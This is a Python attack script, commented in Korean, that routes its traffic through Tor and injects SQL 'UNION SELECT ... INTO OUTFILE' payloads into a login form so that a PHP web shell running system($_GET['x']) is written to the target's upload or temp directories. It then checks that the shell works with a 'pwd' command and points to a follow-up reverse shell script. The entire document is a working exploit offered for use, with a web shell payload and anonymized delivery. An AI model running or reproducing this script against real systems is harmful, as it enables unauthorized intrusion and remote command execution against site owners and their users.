#!/usr/bin/env python3
"""
SQL Injection을 통한 웹쉘 파일 쓰기
MySQL의 INTO OUTFILE을 이용
"""

import requests
import sys

def sql_file_write(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] C2: {attacker_ip}:{attacker_port}")

    # 웹쉘 코드 (단순)
    webshell_code = "<?php system($_GET['x']); ?>"

    # SQL Injection으로 파일 쓰기
    # MySQL: SELECT '코드' INTO OUTFILE '/var/www/html/uploads/shell.php'

    payloads = [
        # 1. 직접 파일 쓰기
        f"' UNION SELECT '{webshell_code}' INTO OUTFILE '/var/www/html/uploads/sqlshell.php' -- ",

        # 2. 다른 경로
        f"' UNION SELECT '{webshell_code}' INTO OUTFILE '/var/www/uploads/sqlshell.php' -- ",

        # 3. 현재 디렉토리
        f"' UNION SELECT '{webshell_code}' INTO OUTFILE './uploads/sqlshell.php' -- ",

        # 4. 절대 경로
        f"' UNION SELECT '{webshell_code}' INTO OUTFILE '/tmp/sqlshell.php' -- ",
    ]

    print("\n[*] SQL Injection으로 웹쉘 쓰기 시도...")

    for i, payload in enumerate(payloads, 1):
        print(f"\n[{i}/{len(payloads)}] 시도 중...")

        try:
            # 로그인 폼에 SQL Injection
            data = {
                'username': payload,
                'password': 'anything'
            }

            resp = session.post(f"{base_url}/login.php", data=data, timeout=10)

            print(f"    Status: {resp.status_code}")

            # 파일이 생성되었는지 테스트
            if 'uploads' in payload:
                test_url = f"{base_url}/uploads/sqlshell.php?x=pwd"
            else:
                test_url = f"{base_url}/tmp/sqlshell.php?x=pwd"

            try:
                test_resp = session.get(test_url, timeout=5)
                if test_resp.status_code == 200 and '/var' in test_resp.text:
                    print(f"    [+] ✅ 성공! 웹쉘 생성됨!")
                    print(f"    [+] URL: {test_url}")
                    return test_url
            except:
                pass

        except Exception as e:
            print(f"    오류: {str(e)[:50]}")

    print("\n[-] SQL Injection 파일 쓰기 실패")
    return None

def main():
    if len(sys.argv) != 4:
        print("사용법: python3 93_sql_file_write.py <TARGET_IP> <ATTACKER_IP> <PORT>")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    webshell_url = sql_file_write(target_ip, attacker_ip, attacker_port)

    if webshell_url:
        print(f"\n[+] 웹쉘 생성 성공!")
        print(f"[*] 이제 리버스 쉘 시도:")
        print(f"    python3 95_direct_reverse_shell.py")

if __name__ == "__main__":
    main()
